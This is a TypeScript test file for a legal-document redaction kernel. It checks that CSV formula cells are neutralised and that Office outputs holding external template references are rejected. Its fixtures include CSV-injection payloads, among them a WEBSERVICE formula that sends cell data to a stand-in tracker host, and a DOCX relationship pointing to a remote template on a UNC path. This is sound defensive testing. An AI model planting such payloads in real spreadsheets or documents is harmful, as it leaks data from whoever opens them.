/**
 * S6 脱敏的格式边界与成果登记复核（复核 S5-B04 遗留、S5-B19）：
 * - CSV 脱敏件中和公式单元格（= + - @ 制表开头的加单引号；纯数字不动），零命中与有遮盖两条路径都经过；
 * - S6 只处理 DOCX 与纯文本，其他格式明确拒绝、不原样输出原件；
 * - 成果登记：无法核验的旧版 Office 等格式拒绝；OOXML 仍含外取引用拒绝；干净的放行。
 */
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createDocx, readZipEntries, writeRawZip } from "@zr-legal/docx-engine";
import { makeKernel, importText, runScenario, type TestKernel } from "./helpers.ts";
import { neutralizeCsvFormulas } from "../src/tools/tools/docx.ts";
import { verifyOfficeArtifact } from "../src/executor/executor.ts";

let tk: TestKernel;
before(async () => {
  tk = await makeKernel({ ZR_MODEL_PROVIDER: "mock", ZR_KERNEL_TCP: "off" }, "s6-formats-firm");
});
after(async () => {
  await tk.kernel.close();
});

test("CSV 公式中和：= + - @ 制表开头的单元格加单引号（含带引号的字段），纯数字、普通文本、换行与转义引号不变", () => {
  const cases: [string, string][] = [
    ['=WEBSERVICE("http://tracker.invalid/?d="&A2),1\n', `'=WEBSERVICE("http://tracker.invalid/?d="&A2),1\n`],
    ['"=1+1",b\r\n', `"'=1+1",b\r\n`],
    ["-5,+3.2,-\n", "-5,+3.2,'-\n"],
    ["@SUM(A1),+cmd\n", "'@SUM(A1),'+cmd\n"],
    ["\tx,y\n", "'\tx,y\n"],
    ['名称,"他说""好""",3\n', '名称,"他说""好""",3\n'],
    ["a,,b\n,\n", "a,,b\n,\n"],
  ];
  for (const [input, expected] of cases) assert.equal(neutralizeCsvFormulas(input), expected, JSON.stringify(input));
});

test("S6 处理 CSV：零命中与有遮盖两条路径都中和公式单元格；不支持的格式明确拒绝、不原样输出", { timeout: 120_000 }, async () => {
  const { inv } = tk;
  const { matter } = await inv("matters.create", { title: "CSV 脱敏", stance: "原告", consent_status: "not_required" });
  const zero = await importText(inv, matter.matter_id, "台账.csv", "项目,金额\n=WEBSERVICE(\"http://tracker.invalid/x\"),100\n");
  const masked = await importText(inv, matter.matter_id, "通讯录.csv", "姓名,电话,备注\n张三,13800138000,=HYPERLINK(\"http://tracker.invalid/\")\n");
  const { run, artifacts } = await runScenario(inv, matter.matter_id, "s6.redaction", { document_version_ids: [zero.document_version_id, masked.document_version_id] });
  assert.equal(run.status, "succeeded", JSON.stringify(run));
  const outs = artifacts.filter((a: any) => a.kind === "s6_redacted");
  assert.equal(outs.length, 2);
  const texts = await Promise.all(outs.map(async (a: any) => Buffer.from((await inv("artifacts.download", { artifact_version_id: a.artifact_version_id })).data_base64, "base64").toString("utf8")));
  const all = texts.join("\n");
  assert.ok(all.includes(`'=WEBSERVICE`), "零命中路径中和公式");
  assert.ok(all.includes(`'=HYPERLINK`), "有遮盖路径中和公式");
  assert.ok(!/(^|[,\n])=/.test(all), "没有以 = 开头的单元格");
  assert.ok(!all.includes("13800138000"), "电话已遮盖");

  const rtf = await importText(inv, matter.matter_id, "旧格式.rtf", "{\\rtf1 测试}");
  const r2 = await runScenario(inv, matter.matter_id, "s6.redaction", { document_version_ids: [rtf.document_version_id] });
  assert.equal(r2.run.status, "failed");
  assert.match(String(r2.events.find((e: any) => e.type === "run.failed")?.payload.error ?? ""), /只处理 DOCX 与纯文本/);
  assert.ok(!r2.artifacts.some((a: any) => a.kind === "s6_redacted"), "不原样输出原件");
});

test("成果登记复核：无法核验的格式拒绝；OOXML 仍含外取引用拒绝；干净的 DOCX 放行", () => {
  const clean = createDocx("意见书", [{ heading: "一", paragraphs: ["正文"] }]);
  for (const f of ["意见书.doc", "旧件.rtf", "表.xlsb", "演示.pps", "文稿.wps", "表.et", "文档.odt", "网页.mht"]) {
    assert.throws(() => verifyOfficeArtifact(f, () => clean), /无法核验外取引用的格式/, f);
  }
  assert.doesNotThrow(() => verifyOfficeArtifact("意见书.docx", () => clean));
  const files = readZipEntries(clean);
  files.set(
    "_rels/.rels",
    Buffer.from(
      files
        .get("_rels/.rels")!
        .toString("utf8")
        .replace("</Relationships>", `<Relationship Id="rX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///\\\\fileserver\\t.dotm" TargetMode="External"/></Relationships>`),
      "utf8",
    ),
  );
  const dirty = writeRawZip([...files.entries()].map(([name, data]) => ({ name, data })));
  assert.throws(() => verifyOfficeArtifact("意见书.docx", () => dirty), /仍含打开时会外取的引用/);
  assert.doesNotThrow(() => verifyOfficeArtifact("草稿.md", () => dirty), "非 Office 成果不在此复核");
});
